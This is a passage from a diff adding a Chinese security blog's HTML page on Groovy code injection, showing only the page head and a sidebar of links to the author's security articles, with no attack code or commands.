@@ -1,0 +1,1153 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+    
+      <link rel="icon" href="/kanxi.jpg">
+    
+
+    <title>
+        
+          浅析Groovy代码注入漏洞 - Mi1k7ea
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="/css/spectre.min.css">
+    <link rel="stylesheet" href="/css/spectre-exp.min.css">
+    <link rel="stylesheet" href="/css/spectre-icons.min.css">
+
+    <!-- Noto Sans TC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC" rel="stylesheet">
+    <!-- Noto Sans SC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC" rel="stylesheet">
+    <!-- Noto Sans -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">
+
+    <!-- theme css & js -->
+    <link rel="stylesheet" href="/css/book.css">
+    <script src="/js/book.js"></script>
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('img')
+})
+</script>
+
+</head>
+
+<body>
+
+<div class="container">
+  <div class="book-container">
+    <div class="columns">
+      <div class="column col-2 hide-lg">
+        <div class="book-sidebar">
+  <h4 class="site-meta">
+    <a href="/">Mi1k7ea</a>
+  </h4>
+  <div class="sidebar-content">
+    <p>Good Good Study</p>
+<ul>
+<li><strong><a href="/archives">归档</a></strong></li>
+</ul>
+<hr>
+<ul>
+<li><strong>Web安全</strong><ul>
+<li>Web安全基础&amp;Tricks<ul>
+<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
+<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
+<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
+<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
+<li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li>
+<li><a href="/2020/03/11/浅析HRS漏洞/">浅析HRS漏洞</a></li>
+<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
+<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
+<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
+<li><a href="/2020/03/05/Redis安全小结/">Redis安全小结</a></li>
+<li><a href="/2020/02/29/SSRF-Tricks小结/">SSRF Tricks小结</a></li>
+<li><a href="/2020/01/21/CSRF-Tricks小结/">CSRF Tricks小结</a></li>
+<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
+<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
+<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
+<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
+<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
+<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
+<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
+<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
+<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
+<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
+<li><a href="/2020/01/26/浅析XSSJacking/">浅析XSSJacking</a></li>
+<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
+<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78716609" target="_blank" rel="noopener">(旧博客)Web安全加固小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78686832" target="_blank" rel="noopener">(旧博客)DoS与DDoS小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78301189" target="_blank" rel="noopener">(旧博客)MySQL数据库提权小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/69952026" target="_blank" rel="noopener">(旧博客)OWASP_top_10漏洞的总结笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76944203" target="_blank" rel="noopener">(旧博客)使用Docker搭建Nginx整数溢出漏洞（CVE-2017-7529）及Python PoC验证</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76862120" target="_blank" rel="noopener">(旧博客)使用Docker搭建Struts2-048漏洞环境及Python PoC验证</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76714002" target="_blank" rel="noopener">(旧博客)webshell的NTFS交换数据流文件隐藏及Python脚本查杀</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/59085529" target="_blank" rel="noopener">(旧博客)关于phpMyAdmin默认安装漏洞的学习笔记</a></li>
+</ul>
+</li>
+<li>Web安全之机器学习<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78457976" target="_blank" rel="noopener">(旧博客)机器学习应用之WebShell检测</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78298719" target="_blank" rel="noopener">(旧博客)数据挖掘之k-means算法的Python实现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78012697" target="_blank" rel="noopener">(旧博客)数据挖掘之决策树归纳算法的Python实现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003975" target="_blank" rel="noopener">(旧博客)数据挖掘之Apriori算法的Python实现</a></li>
+</ul>
+</li>
+<li>WriteUp Web<ul>
+<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
+<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
+<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
+<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
+<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
+<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
+<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
+<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
+<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
+<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
+<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
+<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
+<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
+<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
+<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
+<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80306977" target="_blank" rel="noopener">(旧博客)通过Pentester_Lab学习XML注入</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/70168346" target="_blank" rel="noopener">(旧博客)Sqli-labs之Less1-10</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60882602" target="_blank" rel="noopener">(旧博客)DVWA之PHP文件包含漏洞（File Inclusion）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60477557" target="_blank" rel="noopener">(旧博客)通过DVWA学习CSRF漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60465854" target="_blank" rel="noopener">(旧博客)通过DVWA学习存储型XSS漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60359729" target="_blank" rel="noopener">(旧博客)通过DVWA学习反射型XSS漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/56307364" target="_blank" rel="noopener">(旧博客)通过DVWA学习SQL盲注</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/56279676" target="_blank" rel="noopener">(旧博客)通过DVWA学习SQL注入漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/54669614" target="_blank" rel="noopener">(旧博客)DVWA之PHP文件上传漏洞（File Upload）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/54630440" target="_blank" rel="noopener">(旧博客)通过DVWA学习命令执行漏洞（Command Execution）</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Java</strong><ul>
+<li>Java安全<ul>
+<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
+<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
+<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
+<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
+<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
+<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
+<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
+<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
+<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
+<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
+<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
+<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
+<li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li>
+<li><a href="/2020/03/16/OGNL表达式注入漏洞总结/">OGNL表达式注入漏洞总结</a></li>
+<li><a href="/2020/03/24/浅析Groovy代码注入漏洞/">浅析Groovy代码注入漏洞</a></li>
+<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
+<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
+<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
+<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
+<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
+<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
+<li><a href="/2020/01/25/Java-Hessian反序列化漏洞/">Java Hessian反序列化漏洞</a></li>
+<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
+<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
+<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
+<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
+<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
+<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
+<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
+<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
+<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
+<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
+<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
+<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
+</ul>
+</li>
+<li>Struts2</li>
+<li>Spring<ul>
+<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
+<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
+<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
+<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
+<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
+<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
+<li><a href="/2020/01/16/Spring-MVC笔记/">Spring MVC笔记</a></li>
+<li><a href="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/">浅析自动绑定漏洞之Spring MVC</a></li>
+<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之CVE-2017-8046</a></li>
+<li><a href="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/">浅析Spring Data Commons之CVE-2018-1273</a></li>
+<li><a href="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/">浅析Spring Messaging之CVE-2018-1270</a></li>
+<li><a href="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/">浅析Spring Web Flow之CVE-2017-4971</a></li>
+<li><a href="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/">浅析Spring Security OAuth2之CVE-2016-4977</a></li>
+</ul>
+</li>
+<li>SpringCloud</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/70228700" target="_blank" rel="noopener">(旧博客)PHP代码审计之基础篇</a></li>
+</ul>
+</li>
+<li>CMS<ul>
+<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78358332" target="_blank" rel="noopener">(旧博客)PHP代码审计实战之MetInfo CMS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78304692" target="_blank" rel="noopener">(旧博客)PHP代码审计实战之XDcms</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+<li><a href="/2020/03/09/Python-urllib-CRLF注入漏洞小结/">Python urllib CRLF注入漏洞小结</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78705998" target="_blank" rel="noopener">(旧博客)Python安全小工具之日志分析识别AWVS扫描</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78445866" target="_blank" rel="noopener">(旧博客)Python安全小工具之Linux日志痕迹清除</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78443601" target="_blank" rel="noopener">(旧博客)Python安全小工具之Web目录扫描器</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003891" target="_blank" rel="noopener">(旧博客)Python安全小工具之计算文件Hash值</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003609" target="_blank" rel="noopener">(旧博客)Python安全小工具之生成高精度字典</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/72972238" target="_blank" rel="noopener">(旧博客)关于《Python绝技：运用Python成为顶级黑客》的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/71152826" target="_blank" rel="noopener">(旧博客)关于《Python黑帽子：黑客与渗透测试编程之道》的学习笔记</a></li>
+</ul>
+</li>
+<li>爬虫<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/68961258" target="_blank" rel="noopener">(旧博客)Python爬虫之基础篇</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78411824" target="_blank" rel="noopener">(旧博客)Python爬虫之爬取动态页面数据</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78840444" target="_blank" rel="noopener">(旧博客)Python爬虫之Scrapy爬虫框架</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78850550" target="_blank" rel="noopener">(旧博客)Python爬虫之分布式爬虫</a></li>
+</ul>
+</li>
+<li>Django<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78505235" target="_blank" rel="noopener">(旧博客)基于Django搭建简单的博客系统</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>Node.js<ul>
+<li><a href="/2020/03/29/浅析Node-js安全/">浅析Node.js安全</a></li>
+<li><a href="/2020/03/29/node-serialize反序列化漏洞/">node-serialize反序列化漏洞</a></li>
+</ul>
+</li>
+<li>AngularJS<ul>
+<li><a href="/2020/03/29/浅析AngularJS安全/">浅析AngularJS安全</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+</ul>
+</li>
+<li>逆向工程<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80334012" target="_blank" rel="noopener">(旧博客)逆向分析HelloWorld程序</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80380974" target="_blank" rel="noopener">(旧博客)逆向分析abex’crackme#1</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80546988" target="_blank" rel="noopener">(旧博客)逆向分析abex’crackme #2</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80549743" target="_blank" rel="noopener">(旧博客)函数调用约定</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80554677" target="_blank" rel="noopener">(旧博客)栈帧</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80558193" target="_blank" rel="noopener">(旧博客)逆向分析Tut.ReverseMe1</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80571933" target="_blank" rel="noopener">(旧博客)PE文件格式</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80611969" target="_blank" rel="noopener">(旧博客)运行时压缩（UPX）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80636568" target="_blank" rel="noopener">(旧博客)基址重定位表</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80636900" target="_blank" rel="noopener">(旧博客)从可执行文件中删除.reloc节区</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80656921" target="_blank" rel="noopener">(旧博客)UPack的PE文件头分析与OEP查找</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80670045" target="_blank" rel="noopener">(旧博客)内嵌补丁练习</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80684358" target="_blank" rel="noopener">(旧博客)Windows消息钩取</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80777748" target="_blank" rel="noopener">(旧博客)DLL注入</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80780830" target="_blank" rel="noopener">(旧博客)DLL卸载</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80789234" target="_blank" rel="noopener">(旧博客)通过修改PE加载DLL</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/82947635" target="_blank" rel="noopener">(旧博客)代码注入（线程注入）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/82954890" target="_blank" rel="noopener">(旧博客)使用汇编语言编写注入代码</a></li>
+</ul>
+</li>
+<li>Fuzzing<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80950537" target="_blank" rel="noopener">(旧博客)Windows缓冲区溢出之SLMail</a></li>
+</ul>
+</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63681200" target="_blank" rel="noopener">(旧博客)被动信息收集之DNS信息收集</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63681596" target="_blank" rel="noopener">(旧博客)被动信息收集之RECON-NG</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63682444" target="_blank" rel="noopener">(旧博客)主动信息收集之主机发现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63684778" target="_blank" rel="noopener">(旧博客)主动信息收集之主机发现的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/64906997" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/66473045" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78301318" target="_blank" rel="noopener">(旧博客)渗透测试之漏洞扫描阶段</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57405291" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统下隐藏痕迹的小技巧</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57403811" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统中的一些信息收集方法</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76598873" target="_blank" rel="noopener">(旧博客)使用Kali无线渗透获取宿舍WiFi密码（WPA）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62239673" target="_blank" rel="noopener">(旧博客)关于Kali的两个Webshell（Webacoo和Weevely）的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62064984" target="_blank" rel="noopener">(旧博客)关于Kali获取HTTP账号密码的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62045632" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP欺骗的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61926977" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP攻击的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61920179" target="_blank" rel="noopener">(旧博客)在Kali中安装IBus的拼音输入法</a></li>
+<li></li>
+</ul>
+</li>
+<li>Metasploit<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60881390" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（一）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62427016" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（二）</a></li>
